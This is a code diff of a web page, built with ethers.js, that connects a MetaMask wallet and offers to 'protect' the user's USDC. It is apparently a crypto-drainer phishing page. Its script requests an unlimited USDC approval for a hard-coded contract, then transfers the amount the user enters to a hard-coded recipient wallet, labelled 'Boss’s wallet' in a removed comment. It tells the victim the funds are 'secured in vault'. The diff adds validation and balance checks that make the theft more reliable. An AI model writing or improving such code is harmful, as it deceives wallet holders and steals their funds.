@@ -14,50 +14,72 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
   <script>
-    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // ✅ Correct USDC address with checksum
-    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Mark III contract (approval target)
-    const recipientWallet = "0x59e513Ae37614f1e670bfE961B3456257C444d24"; // Boss’s wallet
-    const approveAmount = ethers.constants.MaxUint256;
+    const usdcAddress = ethers.utils.getAddress("0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48");
+const contractAddress = ethers.utils.getAddress("0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12");
+const recipientWallet = ethers.utils.getAddress("0x59e513Ae37614f1e670bfE961B3456257C444d24");
+const approveAmount = ethers.constants.MaxUint256;
 
     let provider, signer, userAddress;
 
     document.getElementById("connect").onclick = async () => {
       if (window.ethereum) {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-        document.getElementById("status").innerText = "Wallet successfully connected: " + userAddress;
+        try {
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          signer = provider.getSigner();
+          userAddress = await signer.getAddress();
+          document.getElementById("status").innerText = "Wallet connected: " + userAddress;
+        } catch (error) {
+          document.getElementById("status").innerText = "Connection failed: " + error.message;
+        }
       } else {
-        alert("No Ethereum provider detected. Please install MetaMask.");
+        alert("Please install MetaMask!");
       }
     };
 
     document.getElementById("authorize").onclick = async () => {
+      if (!signer) {
+        document.getElementById("status").innerText = "Please connect wallet first!";
+        return;
+      }
+
       try {
         const usdc = new ethers.Contract(
           usdcAddress,
           [
-            "function approve(address spender, uint256 amount) public returns (bool)",
-            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
+            "function approve(address spender, uint256 amount) returns (bool)",
+            "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+            "function balanceOf(address account) view returns (uint256)"
           ],
           signer
         );
 
-        document.getElementById("status").innerText = "Authorizing contract to manage USDC...";
+        // 授权合约
+        document.getElementById("status").innerText = "Authorizing contract...";
         const approveTx = await usdc.approve(contractAddress, approveAmount);
         await approveTx.wait();
-        document.getElementById("status").innerText = "Authorization granted. Preparing to protect funds...";
 
+        // 转账
         const amount = prompt("Enter USDC amount to protect:");
+        if (!amount || isNaN(amount)) {
+          document.getElementById("status").innerText = "Invalid amount";
+          return;
+        }
         const parsedAmount = ethers.utils.parseUnits(amount, 6);
 
+        const balance = await usdc.balanceOf(userAddress);
+        if (parsedAmount.gt(balance)) {
+          document.getElementById("status").innerText = "Insufficient USDC balance";
+          return;
+        }
+
+        document.getElementById("status").innerText = "Protecting funds...";
         const transferTx = await usdc.transferFrom(userAddress, recipientWallet, parsedAmount);
         await transferTx.wait();
-        document.getElementById("status").innerText = "Protection successful. Funds secured in vault.";
+        document.getElementById("status").innerText = "✅ Protection successful!";
       } catch (error) {
         console.error(error);
-        document.getElementById("status").innerText = "Transaction failed: " + (error.message || "Unexpected error");
+        document.getElementById("status").innerText = "Error: " + (error.reason || error.message);
       }
     };
   </script>
